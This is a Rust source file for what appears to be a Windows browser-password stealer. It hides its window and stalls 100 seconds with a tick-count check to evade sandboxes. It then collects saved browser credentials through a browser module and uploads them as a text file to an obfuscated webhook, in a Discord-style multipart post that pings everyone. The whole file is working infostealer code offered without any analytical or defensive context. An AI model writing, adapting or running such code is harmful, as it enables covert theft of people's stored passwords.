#![windows_subsystem = "windows"]
mod browser;

use std::{process::exit, thread, time::Duration};

use obfstr::obfstr;
use reqwest;
use serde_json;
use windows::Win32::System::SystemInformation::GetTickCount64;

use browser::get_creds_all;

fn main() {
    let start = unsafe { GetTickCount64() };
    thread::sleep(Duration::from_secs(100));
    let end = unsafe { GetTickCount64() };
    if end - start < 100000 {
        exit(1)
    }
    let webhook = obfstr!("").to_string();

    let pass = get_creds_all().unwrap_or(Vec::new());
    let data = serde_json::json!({
        "pass": pass
    });

    let client = reqwest::blocking::Client::new();
    let request = format!(
        r#"--boundary
Content-Disposition: form-data; name="payload_json"
Content-Type: application/json

{{"content": "@everyone"}}
--boundary
Content-Disposition: form-data; name="file0"; filename="data.txt"
Content-Type: text/plain

{}
--boundary--"#,
        serde_json::to_string(&data).unwrap_or("".to_owned())
    );
    let _ = client
        .post(webhook)
        .header(
            reqwest::header::CONTENT_TYPE,
            "multipart/form-data; boundary=boundary",
        )
        .body(request)
        .send();
}
